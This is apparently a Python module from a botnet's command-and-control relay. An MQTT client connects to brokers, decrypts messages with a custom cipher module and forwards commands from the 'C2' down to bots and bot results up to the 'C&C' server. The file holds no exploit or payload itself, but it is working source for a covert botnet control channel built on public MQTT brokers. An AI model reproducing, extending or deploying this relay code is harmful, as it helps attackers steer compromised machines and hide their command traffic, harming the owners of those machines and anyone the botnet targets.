import hashlib
import logging
import time
import json
import paho.mqtt.client as mqtt
from paho.mqtt import MQTTException
import cipher


class ColoredFormatter(logging.Formatter):
    BLUE = "\033[94m"
    RED = "\033[91m"
    RESET = "\033[0m"

    def __init__(self, is_relay, fmt=None):
        color = self.RED if is_relay else self.BLUE
        self.color = color
        fmt = fmt or "%(levelname)s - %(message)s"
        super().__init__(fmt)

    def format(self, record):
        message = super().format(record)
        return f"{self.color}{message}{self.RESET}"

class Logger:
    def __init__(self, is_relay=False):
        self.logger = logging.getLogger(f"bot_logger_mqtt_{id(self)}")
        self.logger.setLevel(logging.DEBUG)
        self.logger.propagate = False  # <--- This prevents duplication

        handler = logging.StreamHandler()
        formatter = ColoredFormatter(is_relay)
        handler.setFormatter(formatter)

        if not self.logger.handlers:
            self.logger.addHandler(handler)


    def info(self, message, bot_id=None, broker=None):
        """Log info message with context."""
        self.logger.info(f"{self.log_context(bot_id, broker)} {message}")

    def error(self, message, bot_id=None, broker=None):
        """Log error message with context."""
        self.logger.error(f"{self.log_context(bot_id, broker)} {message}")

    def warning(self, message, bot_id=None, broker=None):
        """Log warning message with context."""
        self.logger.warning(f"{self.log_context(bot_id, broker)} {message}")

    def log_context(self, bot_id=None, broker=None):
        """Generate contextual log prefix."""
        if bot_id and broker:
            return f"{bot_id}::{broker}"
        elif bot_id:
            return f"{bot_id}: "
        elif broker:
            return f"{broker}: "
        return ""


class MQTTConfig:
    def __init__(self):
        self.max_retries = 5
        self.retry_delay = 1
        self.time_out = 30


class MQTTClient:
    def __init__(self, client_id, broker, result_queue, relay=False):
        self.client_id = client_id
        self.broker = broker
        self.result_queue = result_queue
        self.is_relay = relay
        self.logger = Logger(is_relay=self.is_relay)
        self.config = MQTTConfig()
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.setup_callbacks()


    def setup_callbacks(self):
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
        self.client.on_publish = self._on_publish
        self.client.on_subscribe = self._on_subscribe
        self.client.on_unsubscribe = self._on_unsubscribe

    def _on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code.is_failure:
            self.logger.error(f"Failed to connect: {reason_code}", self.client_id, self.broker)
            return False
        self.logger.info("Connected successfully", self.client_id, self.broker)
        if userdata.get('target') == "subscribe":
            client.subscribe(userdata['topic'])
        else:
            userdata['connected'] = True

    def _on_message(self, client, userdata, message):
        topic = message.topic
        payload = message.payload.decode('utf-8')
        self.logger.info(f"Received message on topic {topic}: {payload}", self.client_id, self.broker)
        self._process_message(client, userdata, topic, payload)

    def _on_publish(self, client, userdata, mid, reason_code=None, properties=None):
        self.logger.info(f"Message published with mid: {mid}", self.client_id, self.broker)

    def _on_subscribe(self, client, userdata, mid, reason_code_list, properties):
        if reason_code_list and not reason_code_list[0].is_failure:
            self.logger.info(f"Subscribed successfully with QoS: {reason_code_list[0].value}",
                             self.client_id, self.broker)
            userdata['subscription_complete'] = True
        else:
            self.logger.error("Subscription failed", self.client_id, self.broker)
            userdata['subscription_complete'] = False

    def _on_unsubscribe(self, client, userdata, mid, reason_code_list, properties):
        if reason_code_list and not reason_code_list[0].is_failure:
            self.logger.info("Unsubscribed successfully", self.client_id, self.broker)
        else:
            self.logger.error("Unsubscribe failed", self.client_id, self.broker)

    def publish(self, topic, message, retain=True):
        userdata = {
            'token': self._generate_token(),
            'bot_id': self.client_id,
            'broker': self.broker,
            'topic': topic,
            'encrypted_message': message,
            'target': "publish",
            'connected': False,
            'retry_count': 0
        }
        self.client.user_data_set(userdata)
        self.logger.info(f"Connecting... to broker", self.client_id, self.broker)
        try:
            self.client.connect(self.broker)
            self.client.loop_start()
            msg_info = self.client.publish(topic, message, qos=1, retain=retain)

            start_time = time.time()
            while not msg_info.is_published():
                if time.time() - start_time > self.config.time_out:
                    return False
                time.sleep(0.1)
            return True

        except Exception as e:
            self.logger.error(f"Publish error: {str(e)}", self.client_id, self.broker)
            return False
        finally:
            self.client.loop_stop()
            self.client.disconnect()

    def subscribe(self, topic, cipher_key=None, is_c2=False):
        userdata = {
            'token': self._generate_token(),
            'topic': topic,
            'cipher_key': cipher_key,
            'target': "subscribe",
            'bot_id': self.client_id,
            'broker': self.broker,
            'connected': False,
            'is_c2': is_c2,
            'subscription_complete': False
        }
        self.client.user_data_set(userdata)

        try:
            self.client.connect(self.broker)
            self.client.loop_start()

            # Wait for connection and subscription with timeout
            start_time = time.time()
            while not userdata['subscription_complete']:
                if time.time() - start_time > self.config.time_out:
                    self.logger.error("Subscription timeout", self.client_id, self.broker)
                    return False
                time.sleep(0.1)
            return True

        except KeyboardInterrupt:
            self.logger.warning("Subscription interrupted by user", self.client_id, self.broker)
            return False
        except Exception as e:
            self.logger.error(f"Subscribe error: {str(e)}", self.client_id, self.broker)
            return False

    def _generate_token(self):
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

    def _process_message(self, client, userdata, topic, payload):
        try:
            decrypted_message = cipher.decrypt(userdata['cipher_key'], payload, userdata['bot_id']) if userdata.get(
                'cipher_key') else payload
            data = json.loads(decrypted_message)
            is_from_c2 = bool(userdata['is_c2'])
            if is_from_c2:
                self.logger.info(f"RELAY Message to BOTS: {data}", self.client_id, self.broker)
                relay_data = {
                    "is_up_link" : False,
                    "decrypted_message" : decrypted_message
                }
            else:
                self.logger.info(f"RELAY Message to C&C: {data}", self.client_id, self.broker)
                relay_data = {
                    "is_up_link" : True,
                    "decrypted_message" : decrypted_message
                }
            json_string = json.dumps(relay_data)
            self.result_queue.put(json_string)
        except Exception as e:
            self.logger.error(f"Message processing error: {str(e)}", self.client_id, self.broker)